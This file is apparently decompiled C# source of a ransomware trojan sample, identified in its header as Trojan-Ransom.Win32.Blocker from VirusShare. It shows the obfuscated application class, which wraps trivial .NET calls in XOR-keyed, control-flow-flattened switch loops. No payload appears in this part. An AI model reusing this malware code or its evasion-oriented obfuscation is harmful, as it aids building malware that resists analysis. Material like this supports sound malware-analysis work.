// Decompiled with JetBrains decompiler
// Type: Final.My.MyApplication
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Final.My
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class MyApplication : WindowsFormsApplicationBase
  {
    [STAThread]
    [EditorBrowsable(EditorBrowsableState.Advanced)]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void Ⴅ(string[] Ⴗ)
    {
      MyComputer.ႨႨ();
      try
      {
        Ⴃ.Ⴅ.Ⴓ(WindowsFormsApplicationBase.UseCompatibleTextRendering, 534, 590);
      }
      finally
      {
      }
      MyProject.Ⴓ.Run(Ⴗ);
    }

    public MyApplication()
      : base(AuthenticationMode.Windows)
    {
      this.IsSingleInstance = false;
      this.EnableVisualStyles = true;
      MyComputer.Ⴄ((WindowsFormsApplicationBase) this, true, 88, 8);
      this.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
    }

    protected override void OnCreateMainForm() => this.MainForm = (Form) MyProject.Ⴈ.Ⴗ();

    static MyApplication() => MyComputer.ႨႨ();

    internal static Assembly Ⴀ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 114:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 6:
            num2 = 5;
            continue;
          case 2:
            num2 = 5;
            continue;
          case 3:
          case 7:
            goto label_8;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴀ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.Assembly;
    }

    internal static Exception Ⴍ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 40:
          num1 = 2;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_3;
          case 1:
            num2 = 5;
            continue;
          case 2:
          case 3:
          case 7:
            goto label_8;
          case 4:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴍ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.InnerException;
    }

    internal static string Ⴈ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 64:
          num1 = 0;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_8;
          case 2:
            goto label_3;
          case 3:
          case 5:
            num2 = 2;
            continue;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴈ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    internal static void Ⴄ([In] Control obj0, [In] Point obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = 2;
            continue;
          case 3:
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 126:
                num2 = 5;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Location = obj1;
    }

    internal static void Ⴗ([In] ContainerControl obj0, [In] SizeF obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
            num1 = 5;
            continue;
          case 2:
          case 4:
            goto label_7;
          case 3:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 38:
                num2 = 2;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.AutoScaleDimensions = obj1;
    }

    internal static object Ⴐ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 20)
      {
        case 0:
          return obj0.GetData(obj1);
        default:
          goto label_0;
      }
    }

    internal static void Ⴃ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 120)
      {
        case 0:
          obj0.SetData(obj1, obj2);
          break;
        case 1:
          obj0.SetData(obj1, obj2);
          break;
        default:
          goto label_0;
      }
    }

    internal static int Ⴓ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 91)
      {
        case 0:
          return obj0.Read(obj1, obj2, obj3);
        default:
          goto label_0;
      }
    }
  }
}
